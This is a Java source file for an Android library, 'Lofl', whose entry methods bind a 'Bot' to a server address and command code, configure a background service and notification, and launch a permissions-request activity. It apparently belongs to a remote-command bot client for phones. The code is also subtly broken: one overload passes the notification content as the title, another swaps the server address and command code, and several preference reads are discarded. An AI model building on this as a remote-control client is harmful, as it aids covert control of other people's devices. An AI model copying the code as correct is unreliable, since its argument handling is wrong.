package com.candroid.lofl;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.candroid.lofl.activities.LoflActivity;
import com.candroid.lofl.api.Bot;
import com.candroid.lofl.data.Constants;
import com.candroid.lofl.services.LoflService;

import static com.candroid.lofl.activities.LoflActivity.SERVICE_NAME_KEY;

public class Lofl {

    public static void lofl(Context context, String serverAddress, String notificationContent, String notificationTitle){
        lofl(context, serverAddress, null, null, notificationContent, notificationContent);
    }


    public static void lofl(Context context, String commandCode, String serverAddress){
        lofl(context, commandCode, serverAddress, null, null, null);
    }

    public static void lofl(Context context, String serverAddress, Class serviceClass, String notificationContent, String notificationTitle){
        lofl(context,  serverAddress, null, serviceClass, notificationContent, notificationTitle);
    }

    public static void lofl(Context context, String serverAddress, Class serviceClass){
        lofl(context,  serverAddress, null, serviceClass, null, null);
    }


    public static void lofl(Context context, String serverAddress){
        lofl(context, serverAddress, null, null, null, null);
    }

    public static void lofl(Context context, String serverAddress, String commandCode, Class serviceClass, String notificationContent, String notificationTitle){
        Bot.bind(serverAddress, commandCode);
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        preferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        sharedPreferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
        sharedPreferences.getString(LoflService.NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName());
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(LoflService.NOTIFICATION_CLICK_ACTIVITY, context.getClass().getName());
        if(serviceClass != null){
            editor.putString(SERVICE_NAME_KEY, serviceClass.getName());
        }
        if(notificationTitle != null){
            editor.putString(Constants.Keys.NOTIFICATION_TITLE_KEY, notificationTitle);
        }
        if(notificationContent != null){
            editor.putString(Constants.Keys.NOTIFICATION_CONTENT_KEY, notificationContent);
        }
        editor.apply();
        ((Activity)context).startActivityForResult(new Intent(context, LoflActivity.class), LoflActivity.PERMISSIONS_REQUEST_CODE);
    }

}
